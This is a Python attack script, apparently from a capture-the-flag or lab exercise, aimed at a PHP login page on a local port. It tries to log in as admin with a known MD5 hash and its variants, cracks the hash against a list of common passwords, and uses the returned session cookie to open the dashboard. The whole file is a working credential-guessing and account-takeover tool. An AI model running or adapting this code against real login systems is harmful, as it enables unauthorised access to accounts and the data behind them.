import requests
import hashlib

# Target information
target_url = "http://127.0.0.1:33038/index.php"
dashboard_url = "http://127.0.0.1:33038/dashboard.php"

# We know the admin password hash
current_hash = "7d39307ae824e70052c0aa16816a9b16"

print("[*] Testing direct login with known hash")
print(f"[*] Hash: {current_hash}")
print()

# Various login attempts
test_attempts = [
    # Direct hash in password field
    {"username": "admin", "password": current_hash},
    
    # Try MD5 before sending (in case client-side hashing)
    {"username": "admin", "password": "admin"},  # Plaintext
    {"username": "admin", "password": hashlib.md5("admin".encode()).hexdigest()},
    {"username": "admin", "password": hashlib.md5("password".encode()).hexdigest()},
    
    # Try with extracted hash permutations
    {"username": "admin", "password": current_hash.upper()},
    {"username": "admin", "password": current_hash.lower()},
]

print("[*] Phase 1: Direct login attempts")
for i, creds in enumerate(test_attempts, 1):
    print(f"  [{i}] username={creds['username']}, password={creds['password'][:30]}..." if len(creds['password']) > 30 else f"  [{i}] username={creds['username']}, password={creds['password']}")
    
    data = {
        'username': creds['username'],
        'password': creds['password'],
        'submit': 'Login'
    }
    
    try:
        response = requests.post(
            target_url,
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
            timeout=10
        )
        
        print(f"      Status: {response.status_code}")
        print(f"      Response: {response.text}")
        
        # Check for cookies
        cookies = response.cookies
        if cookies.get('PHPSESSID'):
            print(f"      [!] PHPSESSID: {cookies.get('PHPSESSID')}")
        
        # Check for redirect
        if 300 <= response.status_code < 400:
            location = response.headers.get('Location', '')
            print(f"      [!] REDIRECT TO: {location}")
            if 'dashboard' in location.lower():
                print(f"\n[!!!] SUCCESS! Login successful!")
                print(f"[!!!] Credentials: {creds}")
                break
        
        print()
    except Exception as e:
        print(f"      Error: {str(e)}")
        print()

print("\n[*] Phase 2: Manual hash lookup attempts")
print("[*] Trying to crack hash locally with common passwords...")

common_passwords = [
    "admin", "password", "123456", "admin123", "password123",
    "qwerty", "letmein", "welcome", "12345678", "abc123",
    "monkey", "1234567", "trustno1", "dragon", "baseball",
    "111111", "iloveyou", "master", "sunshine", "ashley",
    "football", "jesus", "michael", "ninja", "mustang",
    "hacker", "security", "p4ssw0rd", "P@ssw0rd", "Admin123",
    "admin1", "root", "toor", "test", "guest"
]

found = False
for pwd in common_passwords:
    pwd_hash = hashlib.md5(pwd.encode()).hexdigest()
    if pwd_hash == current_hash:
        print(f"\n[!!!] PASSWORD CRACKED!")
        print(f"[!!!] admin:{pwd}")
        
        # Try login
        data = {
            'username': 'admin',
            'password': pwd,
            'submit': 'Login'
        }
        
        response = requests.post(
            target_url,
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
            timeout=10
        )
        
        print(f"\nLogin attempt with cracked password:")
        print(f"  Status: {response.status_code}")
        print(f"  Response: {response.text}")
        
        cookies = response.cookies
        if cookies.get('PHPSESSID'):
            print(f"  PHPSESSID: {cookies.get('PHPSESSID')}")
            
            # Verify dashboard
            dash = requests.get(
                dashboard_url,
                cookies={'PHPSESSID': cookies.get('PHPSESSID')},
                timeout=10
            )
            print(f"\n  Dashboard status: {dash.status_code}")
            print(f"  Dashboard content (first 300 chars): {dash.text[:300]}")
            found = True
        break

if not found:
    print("\n[-] Password not in common list")
    print("[*] Hash 7d39307ae824e70052c0aa16816a9b16 not cracked")

print("\n[*] Complete")
